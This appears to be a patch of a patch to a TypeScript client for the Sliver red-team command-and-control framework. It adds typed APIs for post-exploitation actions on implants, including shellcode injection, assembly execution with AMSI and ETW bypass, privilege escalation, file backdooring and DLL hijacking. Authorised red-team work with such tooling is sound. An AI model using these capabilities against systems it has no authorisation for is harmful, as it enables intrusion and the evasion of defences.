@@ -1,5 +1,5 @@
 diff --git a/src/client.ts b/src/client.ts
-index c2baf89..4dc189d 100644
+index c2baf89..c6a3306 100644
 --- a/src/client.ts
 +++ b/src/client.ts
 @@ -6,13 +6,24 @@ import { BehaviorSubject, Subject, filter, map, type Observable } from "rxjs";
@@ -10,6 +10,7 @@ index c2baf89..4dc189d 100644
 +import { timeoutSecondsToNanoseconds, withTimeoutSignal } from "./internal/timeout";
  import { TunnelManager } from "./internal/tunnelManager";
  import { hasWireGuardWrapper, startWireGuardProxy, type WireGuardProxySession } from "./internal/wgProxy";
+-import { BeaconTask } from "./pb/clientpb/client";
 +import {
 +  RPC_MESSAGE_DOMAINS,
 +  TUNNEL_STREAM_MAX_PAYLOAD_BYTES,
@@ -18,7 +19,7 @@ index c2baf89..4dc189d 100644
 +  rpcTlsAuthorityOverride,
 +  type RpcMessageDomain,
 +} from "./messageBudget";
- import { BeaconTask } from "./pb/clientpb/client";
++import { BeaconTask, ShellcodeEncoder } from "./pb/clientpb/client";
  import type {
 +  BeaconTasks,
    Event,
@@ -28,7 +29,7 @@ index c2baf89..4dc189d 100644
    Sessions,
    Version,
    Beacons,
-@@ -30,18 +41,23 @@ import type {
+@@ -30,18 +41,30 @@ import type {
    StagerListenerReq,
    UniqueWGIP,
  } from "./pb/clientpb/client";
@@ -54,10 +55,17 @@ index c2baf89..4dc189d 100644
 -const KiB = 1024;
 -const MiB = 1024 * KiB;
 -const GiB = 1024 * MiB;
++const M4_DEFAULT_TIMEOUT_SECONDS = 60;
++const M4_IDENTITY_TIMEOUT_SECONDS = 30;
++const M4_SECRET_MAX_PAYLOAD_BYTES = 1024 * 1024;
++const M4_REMOTE_HOSTNAME_MAX_CHARACTERS = 255;
++const M4_REMOTE_SERVICE_NAME_MAX_CHARACTERS = 256;
++const M4_REMOTE_SERVICE_DESCRIPTION_MAX_CHARACTERS = 4_096;
++const M4_REMOTE_COMMAND_LINE_MAX_CHARACTERS = 32_767;
  const EVENT_RETRY_INITIAL_MS = 500;
  const EVENT_RETRY_MAX_MS = 10_000;
 
-@@ -68,18 +84,95 @@ export interface HTTPSListenerOptions extends HTTPListenerOptions {
+@@ -68,18 +91,232 @@ export interface HTTPSListenerOptions extends HTTPListenerOptions {
    randomizeJARM?: boolean;
  }
 
@@ -103,6 +111,143 @@ index c2baf89..4dc189d 100644
 +  | { type: "string"; value: string }
 +  | { type: "dword"; value: number }
 +  | { type: "qword"; value: string };
++
++export interface ExecuteOptions {
++  path: string;
++  args?: string[];
++  output?: boolean;
++  background?: boolean;
++  stdoutPath?: string;
++  stderrPath?: string;
++  envInheritance?: boolean;
++  env?: Readonly<Record<string, string>>;
++  useToken?: boolean;
++  hideWindow?: boolean;
++  parentPid?: number;
++}
++
++export interface ExecuteAssemblyOptions {
++  arguments?: string[];
++  process?: string;
++  isDll?: boolean;
++  arch?: string;
++  className?: string;
++  method?: string;
++  appDomain?: string;
++  parentPid?: number;
++  processArgs?: string[];
++  inProcess?: boolean;
++  runtime?: string;
++  amsiBypass?: boolean;
++  etwBypass?: boolean;
++}
++
++export interface ExecuteShellcodeOptions {
++  pid?: number;
++  rwxPages?: boolean;
++}
++
++export interface SideloadOptions {
++  processName?: string;
++  args?: string[];
++  entryPoint?: string;
++  keepAlive?: boolean;
++  isDll?: boolean;
++  isUnicode?: boolean;
++  parentPid?: number;
++  processArgs?: string[];
++}
++
++export interface SpawnDllOptions {
++  processName?: string;
++  args?: string[];
++  entryPoint?: string;
++  keepAlive?: boolean;
++}
++
++export interface MigrateOptions {
++  pid?: number;
++  processName?: string;
++  config: ImplantConfig;
++  encoder?: ShellcodeEncoder;
++  name: string;
++}
++
++export interface MsfOptions {
++  payload?: string;
++  lhost: string;
++  lport?: number;
++  encoder?: string;
++  iterations?: number;
++}
++
++export interface MsfRemoteOptions extends MsfOptions {
++  pid: number;
++}
++
++export interface SshCommandOptions {
++  username: string;
++  hostname: string;
++  port?: number;
++  command?: string | string[];
++  password?: string;
++  privateKey?: Buffer;
++  kerberosConfigPath?: string;
++  kerberosKeytab?: Buffer;
++  kerberosRealm?: string;
++}
++
++export interface StartRemoteServiceOptions {
++  hostname: string;
++  serviceName: string;
++  serviceDescription: string;
++  binaryPath: string;
++  args?: string;
++}
++
++export interface RemoveRemoteServiceOptions {
++  hostname: string;
++  serviceName: string;
++}
++
++export interface RunAsOptions {
++  username: string;
++  processName: string;
++  args?: string;
++  domain?: string;
++  password?: string;
++  showWindow?: boolean;
++  netOnly?: boolean;
++}
++
++export type WindowsLogonType = 2 | 3 | 4 | 5 | 7 | 8 | 9;
++
++export interface MakeTokenOptions {
++  username: string;
++  password: string;
++  domain?: string;
++  logonType?: WindowsLogonType;
++}
++
++export interface GetSystemOptions {
++  config: ImplantConfig;
++  hostingProcess?: string;
++}
++
++export interface BackdoorOptions {
++  filePath: string;
++  profileName?: string;
++  name?: string;
++}
++
++export interface HijackDllOptions {
++  referenceDllPath: string;
++  targetLocation: string;
++  referenceDll?: Buffer;
++  targetDll?: Buffer;
++  profileName?: string;
++  name?: string;
++}
 +
  export interface Tunnel {
    readonly id: string;
@@ -156,7 +301,7 @@ index c2baf89..4dc189d 100644
    }
 
    protected async unary<T>(timeoutSeconds: number, fn: (signal: AbortSignal) => Promise<T>): Promise<T> {
-@@ -106,7 +199,10 @@ class BaseCommands {
+@@ -106,7 +343,10 @@ class BaseCommands {
 
    download(path: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Buffer> {
      return this.unary(timeoutSeconds, async (signal) => {
@@ -168,7 +313,7 @@ index c2baf89..4dc189d 100644
        if (download.Encoder === "gzip") {
          return await gunzip(download.Data);
        }
-@@ -120,7 +216,7 @@ class BaseCommands {
+@@ -120,7 +360,7 @@ class BaseCommands {
    upload(path: string, data: Buffer, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return this.unary(timeoutSeconds, async (signal) => {
        const payload = await gzip(data);
@@ -177,7 +322,7 @@ index c2baf89..4dc189d 100644
          { Path: path, Encoder: "gzip", Data: payload, Request: this.request(timeoutSeconds) },
          { signal },
        );
-@@ -167,7 +263,7 @@ class BaseCommands {
+@@ -167,7 +407,7 @@ class BaseCommands {
 
    processDump(pid: number, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -186,7 +331,7 @@ index c2baf89..4dc189d 100644
      );
    }
 
-@@ -213,7 +309,7 @@ class BaseCommands {
+@@ -213,7 +453,7 @@ class BaseCommands {
      timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
    ) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -195,7 +340,7 @@ index c2baf89..4dc189d 100644
          {
            Pid: pid,
            Data: shellcode,
-@@ -261,7 +357,7 @@ class BaseCommands {
+@@ -261,7 +501,7 @@ class BaseCommands {
 
    executeAssembly(assembly: Buffer, args: string[] = [], process = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -204,7 +349,7 @@ index c2baf89..4dc189d 100644
          { Assembly: assembly, Arguments: args, Process: process, Request: this.request(timeoutSeconds) },
          { signal },
        ),
-@@ -288,7 +384,7 @@ class BaseCommands {
+@@ -288,7 +528,7 @@ class BaseCommands {
      timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
    ) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -213,7 +358,7 @@ index c2baf89..4dc189d 100644
          { Data: data, ProcessName: processName, Args: args, EntryPoint: entryPoint, Request: this.request(timeoutSeconds) },
          { signal },
        ),
-@@ -303,7 +399,7 @@ class BaseCommands {
+@@ -303,7 +543,7 @@ class BaseCommands {
      timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
    ) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -222,7 +367,7 @@ index c2baf89..4dc189d 100644
          { Data: data, EntryPoint: entrypoint, ProcessName: processName, Args: args, Request: this.request(timeoutSeconds) },
          { signal },
        ),
-@@ -312,7 +408,7 @@ class BaseCommands {
+@@ -312,7 +552,7 @@ class BaseCommands {
 
    screenshot(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
      return this.unary(timeoutSeconds, (signal) =>
@@ -231,7 +376,7 @@ index c2baf89..4dc189d 100644
      );
    }
  }
-@@ -320,16 +416,17 @@ class BaseCommands {
+@@ -320,16 +560,17 @@ class BaseCommands {
  export class InteractiveBeacon extends BaseCommands {
    constructor(
      rpc: SliverRPCClient,
@@ -251,7 +396,7 @@ index c2baf89..4dc189d 100644
        BeaconID: this.beaconId,
        SessionID: "",
      };
-@@ -349,7 +446,7 @@ export class InteractiveBeacon extends BaseCommands {
+@@ -349,7 +590,7 @@ export class InteractiveBeacon extends BaseCommands {
        wait: async (waitTimeoutSeconds = timeoutSeconds) => {
          const beaconTask = await waitForBeaconTask(this.taskResult$, taskId, waitTimeoutSeconds);
          const taskContent = await this.unary(waitTimeoutSeconds, (signal) =>
@@ -260,7 +405,7 @@ index c2baf89..4dc189d 100644
          );
          return Ls.decode(taskContent.Response);
        },
-@@ -365,16 +462,17 @@ export class InteractiveBeacon extends BaseCommands {
+@@ -365,16 +606,17 @@ export class InteractiveBeacon extends BaseCommands {
  export class InteractiveSession extends BaseCommands {
    constructor(
      rpc: SliverRPCClient,
@@ -280,7 +425,7 @@ index c2baf89..4dc189d 100644
        BeaconID: "",
        SessionID: this.sessionId,
      };
-@@ -396,30 +494,47 @@ export class InteractiveSession extends BaseCommands {
+@@ -396,30 +638,47 @@ export class InteractiveSession extends BaseCommands {
        map((msg) => msg.Data),
      );
 
@@ -344,7 +489,7 @@ index c2baf89..4dc189d 100644
          await this.unary(DEFAULT_TIMEOUT_SECONDS, (signal) =>
            this.rpc.closeTunnel({ TunnelID: tunnelId, SessionID: this.sessionId }, { signal }),
          );
-@@ -433,8 +548,8 @@ export class SliverClient {
+@@ -433,8 +692,8 @@ export class SliverClient {
    static readonly EVENT_BEACON_TASKRESULT = "beacon-taskresult";
 
    private readonly empty = {};
@@ -355,7 +500,7 @@ index c2baf89..4dc189d 100644
 
    private eventsAbort: AbortController | null = null;
    private tunnels: TunnelManager | null = null;
-@@ -467,33 +582,56 @@ export class SliverClient {
+@@ -467,33 +726,66 @@ export class SliverClient {
      return `${this.config.lhost}:${this.config.lport}`;
    }
 
@@ -363,31 +508,20 @@ index c2baf89..4dc189d 100644
 -    const options: Record<string, number | string> = {
 -      "grpc.max_send_message_length": (2 * GiB) - 1,
 -      "grpc.max_receive_message_length": (2 * GiB) - 1,
--    };
 +  private clientFor(domain: RpcMessageDomain): SliverRPCClient {
 +    const client = this.rpcClients[domain];
 +    if (!client) throw new Error("SliverClient is not connected");
 +    return client;
 +  }
-
--    if (this.wireGuardProxy) {
--      options["grpc.ssl_target_name_override"] = this.config.lhost;
--      options["grpc.default_authority"] = this.config.lhost;
--    }
++
 +  get rpc(): SliverRPCClient {
 +    return this.clientFor("control");
 +  }
-
--    return options;
++
 +  private get inventoryRpc(): SliverRPCClient {
 +    return this.clientFor("inventory");
-   }
-
--  get rpc(): SliverRPCClient {
--    if (!this.rpcClient) {
--      throw new Error("SliverClient is not connected");
--    }
--    return this.rpcClient;
++  }
++
 +  private get artifactRpc(): SliverRPCClient {
 +    return this.clientFor("artifact");
 +  }
@@ -406,9 +540,13 @@ index c2baf89..4dc189d 100644
 +      Timeout: timeoutSecondsToNanoseconds(timeoutSeconds),
 +      BeaconID: "",
 +      SessionID: sessionId,
-+    };
+     };
 +  }
-+
+
+-    if (this.wireGuardProxy) {
+-      options["grpc.ssl_target_name_override"] = this.config.lhost;
+-      options["grpc.default_authority"] = this.config.lhost;
+-    }
 +  private beaconRequest(beaconId: string, timeoutSeconds: number): CommonRequest {
 +    return {
 +      Async: true,
@@ -416,6 +554,22 @@ index c2baf89..4dc189d 100644
 +      BeaconID: beaconId,
 +      SessionID: "",
 +    };
++  }
+
+-    return options;
++  private m4SessionRequest(sessionId: string, timeoutSeconds: number): CommonRequest {
++    assertNonEmptyString(sessionId, "Session id");
++    return this.sessionRequest(sessionId, timeoutSeconds);
+   }
+
+-  get rpc(): SliverRPCClient {
+-    if (!this.rpcClient) {
+-      throw new Error("SliverClient is not connected");
+-    }
+-    return this.rpcClient;
++  private m4BeaconRequest(beaconId: string, timeoutSeconds: number): CommonRequest {
++    assertNonEmptyString(beaconId, "Beacon id");
++    return this.beaconRequest(beaconId, timeoutSeconds);
    }
 
    get isConnected(): boolean {
@@ -429,7 +583,7 @@ index c2baf89..4dc189d 100644
 
      this.eventsAbort = new AbortController();
      this.tunnels = new TunnelManager();
-@@ -505,15 +643,21 @@ export class SliverClient {
+@@ -505,15 +797,21 @@ export class SliverClient {
          rpcTarget = this.wireGuardProxy.rpcHost();
        }
 
@@ -456,7 +610,7 @@ index c2baf89..4dc189d 100644
        this.startEventsStream();
        return this;
      } catch (error) {
-@@ -529,9 +673,11 @@ export class SliverClient {
+@@ -529,9 +827,11 @@ export class SliverClient {
      await this.tunnels?.stop();
      this.tunnels = null;
 
@@ -471,7 +625,7 @@ index c2baf89..4dc189d 100644
 
      const wireGuardProxy = this.wireGuardProxy;
      this.wireGuardProxy = null;
-@@ -541,14 +687,14 @@ export class SliverClient {
+@@ -541,14 +841,14 @@ export class SliverClient {
    }
 
    private startEventsStream(): void {
@@ -488,7 +642,7 @@ index c2baf89..4dc189d 100644
          this.eventStreamStateSubject.next({
            status: attempt === 0 ? "connecting" : "retrying",
            attempt,
-@@ -568,7 +714,7 @@ export class SliverClient {
+@@ -568,7 +868,7 @@ export class SliverClient {
            }
          } catch (err) {
            // Abort is expected on disconnect; don't surface it as a retry.
@@ -497,7 +651,7 @@ index c2baf89..4dc189d 100644
              return;
            }
 
-@@ -597,194 +743,904 @@ export class SliverClient {
+@@ -597,180 +897,1611 @@ export class SliverClient {
    }
 
    getSessions(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Sessions> {
@@ -678,6 +832,14 @@ index c2baf89..4dc189d 100644
 -    };
 -
 -    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.startHTTPSListener(request, { signal }));
+-  }
+-
+-  startTCPStagerListener(host: string, port: number, data: Buffer, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+-    return this.startTCPStagerListenerWithOptions({ Protocol: 0, Host: host, Port: port, Data: data, ProfileName: "" }, timeoutSeconds);
+-  }
+-
+-  startTCPStagerListenerWithOptions(request: StagerListenerReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.startTCPStagerListener(request, { signal }));
 +  unsetEnvSession(sessionId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UnsetEnv> {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.unsetEnv(
@@ -687,8 +849,8 @@ index c2baf89..4dc189d 100644
 +    );
    }
 
--  startTCPStagerListener(host: string, port: number, data: Buffer, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
--    return this.startTCPStagerListenerWithOptions({ Protocol: 0, Host: host, Port: port, Data: data, ProfileName: "" }, timeoutSeconds);
+-  getCompiler(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Compiler> {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.getCompiler(this.empty, { signal }));
 +  unsetEnvBeacon(beaconId: string, name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UnsetEnv> {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.unsetEnv(
@@ -698,42 +860,29 @@ index c2baf89..4dc189d 100644
 +    );
    }
 
--  startTCPStagerListenerWithOptions(request: StagerListenerReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.startTCPStagerListener(request, { signal }));
+-  generateUniqueIP(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UniqueWGIP> {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generateUniqueIP(this.empty, { signal }));
 -  }
 +  // --- Explicit M2 session workbench APIs ---
 
--  getCompiler(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Compiler> {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.getCompiler(this.empty, { signal }));
-+  currentTokenOwnerSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+-  generateImplant(config: ImplantConfig, name = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generate({ Config: config, Name: name }, { signal }));
++  currentTokenOwnerSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.currentTokenOwner(
-+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
++        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
 +        { signal },
 +      ),
 +    );
    }
 
--  generateUniqueIP(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<UniqueWGIP> {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generateUniqueIP(this.empty, { signal }));
-+  listEnvSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
-+    return this.getEnvSession(sessionId, "", timeoutSeconds);
-   }
-
--  generateImplant(config: ImplantConfig, name = "", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generate({ Config: config, Name: name }, { signal }));
-+  revealEnvSession(sessionId: string, exactName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
-+    assertNonEmptyString(exactName, "Environment variable name");
-+    return this.getEnvSession(sessionId, exactName, timeoutSeconds);
-   }
-
 -  async generate(config: ImplantConfig, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
 -    const res = await this.generateImplant(config, "", timeoutSeconds);
 -    return res.File;
-+  ifconfigSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
++  currentTokenOwnerBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
-+      this.rpc.ifconfig(
-+        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
++      this.rpc.currentTokenOwner(
++        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
 +        { signal },
 +      ),
 +    );
@@ -743,6 +892,34 @@ index c2baf89..4dc189d 100644
 -    return withTimeoutSignal(timeoutSeconds, async (signal) => {
 -      await this.rpc.generateSpoofMetadata(req, { signal });
 -    });
++  listEnvSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
++    return this.getEnvSession(sessionId, "", timeoutSeconds);
+   }
+
+-  async regenerate(implantName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+-    const res = await this.regenerateImplant(implantName, timeoutSeconds);
+-    return res.File;
++  revealEnvSession(sessionId: string, exactName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<EnvInfo> {
++    assertNonEmptyString(exactName, "Environment variable name");
++    return this.getEnvSession(sessionId, exactName, timeoutSeconds);
+   }
+
+-  regenerateImplant(implantName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
++  ifconfigSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
+     return withTimeoutSignal(timeoutSeconds, (signal) =>
+-      this.rpc.regenerate({ ImplantName: implantName }, { signal }),
++      this.rpc.ifconfig(
++        { Request: this.sessionRequest(sessionId, timeoutSeconds) },
++        { signal },
++      ),
+     );
+   }
+
+-  generateStage(request: GenerateStageReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
+-    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generateStage(request, { signal }));
+-  }
+-
+-  stageImplantBuild(buildNames: string[], timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
 +  netstatSession(
 +    sessionId: string,
 +    options: SessionNetstatOptions,
@@ -761,11 +938,8 @@ index c2baf89..4dc189d 100644
 +        { signal },
 +      ),
 +    );
-   }
-
--  async regenerate(implantName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
--    const res = await this.regenerateImplant(implantName, timeoutSeconds);
--    return res.File;
++  }
++
 +  pwdSession(sessionId: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.pwd(
@@ -773,21 +947,17 @@ index c2baf89..4dc189d 100644
 +        { signal },
 +      ),
 +    );
-   }
-
--  regenerateImplant(implantName: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
++  }
++
 +  cdSession(sessionId: string, path: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
-     return withTimeoutSignal(timeoutSeconds, (signal) =>
--      this.rpc.regenerate({ ImplantName: implantName }, { signal }),
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.cd(
 +        { Path: path, Request: this.sessionRequest(sessionId, timeoutSeconds) },
 +        { signal },
 +      ),
-     );
-   }
-
--  generateStage(request: GenerateStageReq, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<Generate> {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.generateStage(request, { signal }));
++    );
++  }
++
 +  lsSession(sessionId: string, path = ".", timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
 +    return withTimeoutSignal(timeoutSeconds, (signal) =>
 +      this.rpc.ls(
@@ -795,9 +965,8 @@ index c2baf89..4dc189d 100644
 +        { signal },
 +      ),
 +    );
-   }
-
--  stageImplantBuild(buildNames: string[], timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
++  }
++
 +  downloadFileSession(
 +    sessionId: string,
 +    path: string,
@@ -813,8 +982,7 @@ index c2baf89..4dc189d 100644
 +    if (fromEnd && (start !== 0 || stop !== 0 || maxLines !== 0)) {
 +      throw new Error("Download from-end cannot be combined with start, stop, or max lines");
 +    }
-     return withTimeoutSignal(timeoutSeconds, async (signal) => {
--      await this.rpc.stageImplantBuild({ Build: buildNames }, { signal });
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
 +      const response = await this.workbenchArtifactRpc.download(
 +        {
 +          Path: path,
@@ -839,14 +1007,9 @@ index c2baf89..4dc189d 100644
 +        response.Data.fill(0);
 +        throw error;
 +      }
-     });
-   }
-
--  implantBuilds(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.implantBuilds(this.empty, { signal }));
--  }
--
--  deleteImplantBuild(name: string, timeoutSeconds = DEFAULT_TIMEOUT_SECONDS): Promise<void> {
++    });
++  }
++
 +  uploadSession(
 +    sessionId: string,
 +    path: string,
@@ -855,8 +1018,7 @@ index c2baf89..4dc189d 100644
 +    timeoutSeconds = DEFAULT_TIMEOUT_SECONDS,
 +  ) {
 +    assertBoundedArtifact(data, "Upload");
-     return withTimeoutSignal(timeoutSeconds, async (signal) => {
--      await this.rpc.deleteImplantBuild({ Name: name }, { signal });
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
 +      const payload = await gzip(data);
 +      try {
 +        const response = await this.workbenchArtifactRpc.upload(
@@ -876,13 +1038,9 @@ index c2baf89..4dc189d 100644
 +      } finally {
 +        payload.fill(0);
 +      }
-     });
-   }
-
--  canaries(timeoutSeconds = DEFAULT_TIMEOUT_SECONDS) {
--    return withTimeoutSignal(timeoutSeconds, (signal) => this.rpc.canaries(this.empty, { signal }));
--  }
--
++    });
++  }
++
 +  grepSession(
 +    sessionId: string,
 +    path: string,
@@ -1261,6 +1419,718 @@ index c2baf89..4dc189d 100644
 +    );
 +  }
 +
++  // --- Explicit M4 execution and privilege APIs ---
++
++  private executeTarget(request: CommonRequest, options: ExecuteOptions, timeoutSeconds: number) {
++    assertNonEmptyString(options.path, "Executable path");
++    const args = m4StringArray(options.args);
++    const background = options.background ?? false;
++    const output = !background && (options.output ?? true);
++    const stdout = options.stdoutPath ?? "";
++    const stderr = options.stderrPath ?? "";
++    const parentPid = boundedUint32(options.parentPid ?? 0, "Parent process id");
++    const useToken = options.useToken ?? false;
++    const hideWindow = options.hideWindow ?? false;
++    const windowsRequest = useToken || hideWindow || parentPid !== 0;
++
++    if (windowsRequest) {
++      if (options.envInheritance || Object.keys(options.env ?? {}).length > 0) {
++        throw new Error("Environment options cannot be combined with Windows execution modifiers");
++      }
++      return withTimeoutSignal(timeoutSeconds, (signal) =>
++        this.rpc.executeWindows(
++          {
++            Path: options.path,
++            Args: args,
++            Output: output,
++            Stdout: stdout,
++            Stderr: stderr,
++            UseToken: useToken,
++            HideWindow: hideWindow,
++            Background: background,
++            PPid: parentPid,
++            Request: request,
++          },
++          { signal },
++        ),
++      );
++    }
++
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.execute(
++        {
++          Path: options.path,
++          Args: args,
++          Output: output,
++          Stdout: stdout,
++          Stderr: stderr,
++          EnvInheritance: options.envInheritance ?? false,
++          Env: m4Environment(options.env),
++          Background: background,
++          PPid: 0,
++          Request: request,
++        },
++        { signal },
++      ),
++    );
++  }
++
++  executeSession(
++    sessionId: string,
++    options: ExecuteOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeTarget(this.m4SessionRequest(sessionId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  executeBeacon(
++    beaconId: string,
++    options: ExecuteOptions,
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeTarget(this.m4BeaconRequest(beaconId, timeoutSeconds), options, timeoutSeconds);
++  }
++
++  executeChildrenSession(sessionId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.executeChildren(
++        { Request: this.m4SessionRequest(sessionId, timeoutSeconds) },
++        { signal },
++      ),
++    );
++  }
++
++  executeChildrenBeacon(beaconId: string, timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS) {
++    return withTimeoutSignal(timeoutSeconds, (signal) =>
++      this.rpc.executeChildren(
++        { Request: this.m4BeaconRequest(beaconId, timeoutSeconds) },
++        { signal },
++      ),
++    );
++  }
++
++  private executeAssemblyTarget(
++    request: CommonRequest,
++    assembly: Buffer,
++    options: ExecuteAssemblyOptions,
++    timeoutSeconds: number,
++  ) {
++    const isDll = options.isDll ?? false;
++    if (isDll && (!options.className?.trim() || !options.method?.trim())) {
++      throw new Error("DLL assembly execution requires a class name and method");
++    }
++    if (!options.inProcess && (options.runtime || options.amsiBypass || options.etwBypass)) {
++      throw new Error("Runtime, AMSI bypass, and ETW bypass require in-process assembly execution");
++    }
++
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedAssembly = m4ArtifactCopy(assembly, "Assembly");
++      try {
++        return await this.artifactRpc.executeAssembly(
++          {
++            Assembly: ownedAssembly,
++            Arguments: m4StringArray(options.arguments),
++            Process: options.process ?? "notepad.exe",
++            IsDLL: isDll,
++            Arch: options.arch ?? "x84",
++            ClassName: options.className ?? "",
++            Method: options.method ?? "",
++            AppDomain: options.appDomain ?? "",
++            PPid: boundedUint32(options.parentPid ?? 0, "Parent process id"),
++            ProcessArgs: options.processArgs === undefined ? [""] : m4StringArray(options.processArgs),
++            InProcess: options.inProcess ?? false,
++            Runtime: options.runtime ?? "",
++            AmsiBypass: options.amsiBypass ?? false,
++            EtwBypass: options.etwBypass ?? false,
++            Request: request,
++          },
++          { signal },
++        );
++      } finally {
++        ownedAssembly.fill(0);
++      }
++    });
++  }
++
++  executeAssemblySession(
++    sessionId: string,
++    assembly: Buffer,
++    options: ExecuteAssemblyOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeAssemblyTarget(
++      this.m4SessionRequest(sessionId, timeoutSeconds),
++      assembly,
++      options,
++      timeoutSeconds,
++    );
++  }
++
++  executeAssemblyBeacon(
++    beaconId: string,
++    assembly: Buffer,
++    options: ExecuteAssemblyOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeAssemblyTarget(
++      this.m4BeaconRequest(beaconId, timeoutSeconds),
++      assembly,
++      options,
++      timeoutSeconds,
++    );
++  }
++
++  private executeShellcodeTarget(
++    request: CommonRequest,
++    shellcode: Buffer,
++    options: ExecuteShellcodeOptions,
++    timeoutSeconds: number,
++  ) {
++    return withTimeoutSignal(timeoutSeconds, async (signal) => {
++      const ownedShellcode = m4ArtifactCopy(shellcode, "Shellcode");
++      try {
++        return await this.artifactRpc.task(
++          {
++            Encoder: "",
++            RWXPages: options.rwxPages ?? false,
++            Pid: boundedUint32(options.pid ?? 0, "Shellcode process id"),
++            Data: ownedShellcode,
++            Request: request,
++          },
++          { signal },
++        );
++      } finally {
++        ownedShellcode.fill(0);
++      }
++    });
++  }
++
++  executeShellcodeSession(
++    sessionId: string,
++    shellcode: Buffer,
++    options: ExecuteShellcodeOptions = {},
++    timeoutSeconds = M4_DEFAULT_TIMEOUT_SECONDS,
++  ) {
++    return this.executeShellcodeTarget(
